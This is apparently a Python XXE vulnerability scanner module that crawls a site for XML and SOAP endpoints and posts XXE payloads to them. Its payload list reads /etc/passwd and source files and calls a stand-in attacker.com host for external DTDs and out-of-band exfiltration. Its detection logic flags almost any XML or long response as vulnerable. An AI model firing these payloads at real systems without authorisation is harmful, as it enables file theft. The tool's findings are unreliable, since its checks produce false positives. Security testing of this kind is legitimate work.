"""
XML External Entity (XXE) vulnerability scanner module
"""

import logging
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style
from urllib.parse import urljoin

logger = logging.getLogger('CyberWolf.XXEScanner')

class XXEScanner:
    """
    Scanner module for detecting XML External Entity (XXE) vulnerabilities
    """
    
    def __init__(self, timeout=10, verbose=False):
        """
        Initialize the XXE scanner
        
        Args:
            timeout (int): Request timeout in seconds
            verbose (bool): Enable verbose output
        """
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        
        # XXE payloads to test
        self.xxe_payloads = [
            # Basic XXE payload
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            
            # XXE with parameter entities
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd" >%xxe;]><foo></foo>',
            
            # XXE with external DTD
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd" >%xxe;]><foo></foo>',
            
            # XXE with OOB data exfiltration
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/collect?data=" >%xxe;]><foo></foo>',
            
            # XXE with local file inclusion
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>',
            
            # XXE with PHP wrapper
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>'
        ]
    
    def scan(self, url, api_key=None):
        """
        Scan the given URL for XXE vulnerabilities
        
        Args:
            url (str): Target URL to scan
            api_key (str, optional): API key for enhanced scanning
        
        Returns:
            list: Found XXE vulnerabilities
        """
        logger.info(f"Starting XXE scan on {url}")
        vulnerabilities = []
        
        try:
            # First, check if the site accepts XML input
            headers = {
                'User-Agent': self.user_agents[0],
                'Content-Type': 'application/xml'
            }
            
            # Try to find XML endpoints
            xml_endpoints = self._find_xml_endpoints(url)
            
            if not xml_endpoints:
                self._log_verbose("No XML endpoints found")
                return vulnerabilities
            
            # Test each endpoint with XXE payloads
            for endpoint in xml_endpoints:
                self._log_verbose(f"Testing endpoint: {endpoint}")
                
                for payload in self.xxe_payloads:
                    try:
                        response = self.session.post(
                            endpoint,
                            data=payload,
                            headers=headers,
                            timeout=self.timeout,
                            verify=True
                        )
                        
                        # Check for XXE indicators in response
                        if self._is_vulnerable_to_xxe(response, payload):
                            vuln = {
                                'type': 'XXE',
                                'endpoint': endpoint,
                                'payload': payload,
                                'status_code': response.status_code,
                                'response_length': len(response.text),
                                'evidence': response.text[:200]  # First 200 chars of response
                            }
                            vulnerabilities.append(vuln)
                            self._log_verbose(f"Found XXE vulnerability at {endpoint}")
                            
                    except requests.RequestException as e:
                        logger.error(f"Error testing XXE payload: {str(e)}")
                        continue
            
            # Use API for enhanced scanning if available
            if api_key:
                self._log_verbose("Using API for enhanced XXE scanning")
                api_vulns = self._api_enhanced_scan(url, api_key)
                vulnerabilities.extend(api_vulns)
            
            logger.info(f"XXE scan completed. Found {len(vulnerabilities)} vulnerabilities")
            return vulnerabilities
            
        except Exception as e:
            logger.error(f"Error during XXE scan: {str(e)}")
            print(f"{Fore.RED}[!] Error during XXE scan: {str(e)}{Style.RESET_ALL}")
            return []
    
    def _find_xml_endpoints(self, url):
        """
        Find potential XML endpoints on the target
        
        Args:
            url (str): Target URL
        
        Returns:
            list: Potential XML endpoints
        """
        endpoints = []
        
        try:
            # Get the main page
            response = self.session.get(
                url,
                headers={'User-Agent': self.user_agents[0]},
                timeout=self.timeout,
                verify=True
            )
            
            # Parse the page for potential XML endpoints
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for common XML endpoint patterns
            for link in soup.find_all('a', href=True):
                href = link['href']
                if any(pattern in href.lower() for pattern in ['xml', 'wsdl', 'soap', 'api', 'rpc']):
                    full_url = urljoin(url, href)
                    endpoints.append(full_url)
            
            # Add common XML endpoints
            common_endpoints = [
                '/api/xml',
                '/api/soap',
                '/api/wsdl',
                '/xmlrpc',
                '/soap',
                '/wsdl',
                '/rpc',
                '/api'
            ]
            
            for endpoint in common_endpoints:
                full_url = urljoin(url, endpoint)
                endpoints.append(full_url)
            
            # Remove duplicates
            endpoints = list(set(endpoints))
            
            return endpoints
            
        except Exception as e:
            logger.error(f"Error finding XML endpoints: {str(e)}")
            return []
    
    def _is_vulnerable_to_xxe(self, response, payload):
        """
        Check if the response indicates an XXE vulnerability
        
        Args:
            response (requests.Response): Response object
            payload (str): XXE payload used
        
        Returns:
            bool: True if vulnerable, False otherwise
        """
        # Check for common XXE indicators
        indicators = [
            'root:',  # Linux/Unix system files
            '<?xml',  # XML response
            'DOCTYPE',  # XML declaration
            'SYSTEM',  # External entity reference
            'file://',  # File protocol
            'php://',  # PHP wrapper
            'http://',  # HTTP protocol
            '&xxe;',  # Entity reference
            'ENTITY'  # Entity declaration
        ]
        
        # Check response content
        content = response.text.lower()
        
        # Check for error messages that might indicate XXE
        error_indicators = [
            'xml parsing error',
            'xml parse error',
            'xml error',
            'entity reference',
            'external entity',
            'doctype',
            'system'
        ]
        
        # Check for file content in response
        file_indicators = [
            'root:x:0:0:',
            'bin/bash',
            'etc/passwd',
            'etc/hosts',
            'windows/system32',
            'program files'
        ]
        
        # Check if any indicators are present
        for indicator in indicators + error_indicators + file_indicators:
            if indicator.lower() in content:
                return True
        
        # Check for unusual response length
        if len(response.text) > 1000:  # Arbitrary threshold
            return True
        
        return False
    
    def _api_enhanced_scan(self, url, api_key):
        """
        Use API for enhanced XXE scanning
        
        Args:
            url (str): Target URL
            api_key (str): API key for authentication
        
        Returns:
            list: Additional vulnerabilities found via API
        """
        # This is a placeholder for actual API integration
        # In a real implementation, you would call a security API service
        self._log_verbose("API enhanced scanning is a placeholder in this version")
        return []
    
    def _log_verbose(self, message):
        """Log message if verbose mode is enabled"""
        if self.verbose:
            logger.debug(message)
            print(f"{Fore.CYAN}[XXE] {message}{Style.RESET_ALL}") 